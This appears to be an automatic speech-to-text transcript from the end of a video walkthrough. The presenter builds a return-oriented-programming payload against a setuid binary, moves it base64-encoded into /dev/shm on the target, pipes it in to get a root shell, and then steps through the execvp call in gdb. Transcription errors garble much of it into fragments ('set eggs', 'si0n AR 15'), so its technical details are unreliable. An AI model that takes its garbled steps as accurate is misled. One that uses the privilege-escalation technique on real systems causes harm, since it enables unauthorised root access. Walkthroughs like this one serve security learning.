it's doing RSI or 15 then return we have to do the null twice so we put 0 in our si0n AR 15 then we can return and now we can do payload plus equals exec VP PLT and then we can put wrap chain and we add the new line and then leet for the IP so if we Python 3 exploit pi had a typo struct that pack okay pop RDI let's see how did I screw this up that all looks good oh it's Python 3 let's just get rid of Python 3 and do Python - everything is encoded and bytes by default and python 3 so that's why we get that can't can tighten 8 string not bytes whatever but getting rid of the Python 3 we have a payload so we can put that to alt text and then if we execute that and gdb so we do GDP IPT CTL gdb dot slash IPT that's why I didn't order complete set eggs to - are al txt run and we can see we have to do set eggs - I we can see let's see it's executing a new program bin - so everything is good so let's cat out text well base64 alt text - w0 bring the server to our box and go dev sh m be alt be 64 paste base 64 - d out to alt text and in order to execute it we can try dot slash IPT CTL - i dev sh m alt text and it's TTY doesn't stay open if we look at ID it did not take effect and that's because I don't know how to explain it it's just running this alt text and then stopping so a good way around that would be to do cat dev ehm alt text and then put cat then pipe it like this and now we enter interactive mode if we do ID we are now completely route the binary has been exploited so what that did if you just cat nothing it just accepts standard in so when we did that it just made it stay open and I don't think we can do that on this side because that's a file so that's why that worked we counted it took it and set it to the input that way then left it staying open and if you wanted to you could probably step through it and gdb so let's do cat exploit PI if you're confused and look at let's see let's take the set UID call or let's see actually let's take the exec VP call so we'll take this and then we'll break on the address and we can run we have to read gdb it set the ergs break on the address be then we're on it we broke on that exact call so remember our 15 or SP and our D eyes should all be what we expect so our 15 0 X 0 then we have our SP which is 0 XA and then where is our di we have Sh so you can see it doing the exact call pulling the arguments and then running so I hope you guys enjoyed the video I know I rushed through that binary exploit one of these days I'm going to step through like Rob Emporium and then we can go in this in depth and not after I probably been talking for 45 minutes so take care guys and I will see you all next week